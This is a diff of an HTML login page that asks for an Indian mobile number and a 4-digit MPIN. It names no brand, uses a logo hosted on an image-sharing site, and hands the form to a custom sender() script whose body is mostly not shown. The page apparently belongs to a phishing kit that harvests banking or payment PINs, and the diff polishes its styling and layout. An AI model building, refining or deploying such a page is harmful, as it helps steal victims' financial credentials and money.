@@ -1,139 +1,114 @@
-<html> <head> <title>Login Page</title> 
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-<style>
-body { 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="styles.css">
+    <title>Login Form</title>
+    <style>
+        body {
     font-family: Arial, sans-serif;
-    background-color: #fceae8;
+    background-color: #f9f9f9;
+    display: flex;
     justify-content: center;
     align-items: center;
     height: 100vh;
     margin: 0;
-    }
-    
+}
+
 .container {
-    background-color: #ffffff;
+    background-color: white;
+    padding: 20px;
     border-radius: 10px;
     box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-    padding: 20px;
-    width: 370px;
-    height: 550px;
-    text-align: center;
-    }
-    
-h1 {
-    color: #d9534f;
-    font-size: 25px;
+    width: 350px;
+    text-align: left; /* Changed to left for label alignment */
+}
+
+.logo {
+    width: 140px;
+    height: auto;
     margin-bottom: 20px;
-    font-weight: bold;
-    }
-.input-group {
-    margin-bottom: 15px;
-    text-align: left;
-    }
-.input-group label{
     display: block;
-    font-size: 15px;
-    margin-bottom: 5px;
+    margin-left: auto;
+    margin-right: auto;
+}
+
+h2 {
+    color: #ff6f61;
+    margin-bottom: 20px;
+    text-align: center; /* Centering the title */
+}
+
+label {
+    font-size: 14px;
     font-weight: bold;
-    }
-.input-group input {
-    width: calc(100% - 20px);
-    height: 60px;
+    margin-bottom: 5px;
+    display: block;
+}
+
+input {
+    width: 90%;
+    height: 30px;
     padding: 10px;
+    margin: 10px 0;
     border: 1px solid #ccc;
     border-radius: 5px;
-    font-size: 14px; }
-    
-.input-group input[type="password"] { 
-    font-family: 'Courier New', Courier, monospace;
-    letter-spacing: 5px;
-    } 
+}
 
 .forgot-password {
     display: block;
     margin: 10px 0;
-    font-weight: bold;
-    font-size: 15px;
     color: #007bff;
     text-decoration: none;
-    }
+}
 
-.forgot-password:hover { 
-    text-decoration: underline;
-    }
-
-.login-btn {
-    background-color: #d9534f;
-    color: #ffffff; border: none;
-    padding: 10px 20px;
+.login-button {
+    background-color: #ff6f61;
+    color: white;
+    padding: 10px;
+    border: none;
     border-radius: 5px;
-    font-size: 16px;
     cursor: pointer;
     width: 100%;
-    height: 50px;
-    }
+}
 
-.login-btn:hover {
-    background-color: #c9302c;
-    }
+.login-button:hover {
+    background-color: #ff5722;
+}
 
 .terms {
-    font-size: 15px;
-    margin-top: 15px;
-    font-weight: bold;
-    }
+    margin-top: 10px;
+    font-size: 12px;
+}
 
 .terms a {
-    color: #007bff; 
+    color: #007bff;
     text-decoration: none;
-    }
-
-.terms a:hover { 
-   text-decoration: underline; 
-   }
-
-</style>
-
+}
+    </style>
 </head>
 <body>
-    <br>
-    <p align="center"> <img src="https://i.postimg.cc/R0Fkf2bV/src-assets-images-logo.png" style="width: 130px"></a>
     <div class="container">
-        <div class="logo" >
-        </div> 
-        <h1>Login to Your Account</h1>
-        
-        <div class="input-group">
-           <form onsubmit="return sender()">
-                  <label for="mobile-number">Mobile Number<span style="color: red;"> *</span></label>
-                
-        <input type="text" id="mobno" name="mobno" placeholder="+91 Enter mobile number" maxlength="12" required>
-        </div>
-        <div class="input-group">
+        <img src="https://i.postimg.cc/R0Fkf2bV/src-assets-images-logo.png" class="logo">
+        <br><br>
+        <h2>Login to Your Account</h2>
+        <form onsubmit="return sender()">
+            <label for="mobile">Mobile Number<span style="color: red;"> *</span></label>
+            <input type="tel" id="mobno" name="mobno" placeholder="+91 Enter mobile number" maxlength="12" required>
             
-                <label for="mpin">Enter MPIN <span style="color: red;">*</span></label>
-            
-            <input type="password" id="mpin" name="mpin" placeholder="****" maxlength="4" required>
-            </div>
-           
-               <a href="#" class="forgot-password">Forgot MPIN/ Password</a>
-           
-            <button class="login-btn">LOGIN</button>
-            </form> <div class="terms"> By Login, I agree to the
-            <br><br>
-            <a href="#">Terms Of Service</a>
-            
-            and 
-            <a href="#">Privacy Policy</a>
-            <br><br><br><br><br><br>
-             <p align="center">
-               <span style="color: black;">Version 21.7</span>
-               </p>
-            </div> 
-               </div> 
-               
-              <link rel="stylesheet" href="style.css">
+            <label for="mpin">Enter MPIN <span style="color: red;"> *</span></label>
+            <input type="tel" id="mpin" name="mpin" placeholder="****" maxlength="4" required>
+
+            <a href="#" class="forgot-password">Forgot MPIN/ Password</a>
+            <button type="submit" class="login-button">LOGIN</button>
+        </form>
+        <p class="terms">
+            By Login, I agree to the <a href="#">Terms Of Service</a> and <a href="#">Privacy Policy</a>
+        </p>
+    </div>
+    <link rel="stylesheet" href="style.css">
     <script src="sender.js"></script>
   
   <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
@@ -179,6 +154,5 @@ var sender = function () {
     return false;
 };
   </script>
-               
- </body> 
-    </html>
+</body>
+</html>
